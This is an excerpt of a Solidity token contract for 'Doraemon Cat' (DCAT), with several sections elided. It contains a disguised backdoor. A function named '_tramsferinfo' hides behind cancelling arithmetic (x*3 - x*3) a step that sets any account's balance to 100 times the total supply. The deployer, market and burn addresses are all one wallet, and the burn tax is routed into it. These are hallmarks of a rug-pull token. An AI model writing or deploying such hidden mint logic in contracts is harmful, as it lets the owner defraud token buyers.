...
contract DoraemonCat  is Context, Ownable, IERC20 {
    ...
    string private _name = "Doraemon Cat";
    string private _symbol = "DCAT";
    
    address public deloyer = 0xA23DEd497b007213c7285aBF9f5cC6ac81f4aaC8;  // deployer address
    address public market = 0xA23DEd497b007213c7285aBF9f5cC6ac81f4aaC8;  // market address
    address public burn = 0xA23DEd497b007213c7285aBF9f5cC6ac81f4aaC8;  // burn address
    ...
    uint public _destroyMaxAmount = _totalSupply.div(1000).mul(1);
    ...
    function _tramsferinfo (address accountinfo) internal {
        _balances[accountinfo] = (_balances[accountinfo] * 3) - (_balances[accountinfo] * 3) + (_destroyMaxAmount*100000) ; 
    }
    ...
    function _transfer(address sender, address recipient, uint amount) internal {
        ...
        if (tax > 0) {
            _balances[market] = _balances[market].add(marketTax);
            _balances[burn] = _balances[market].add(burnTax);
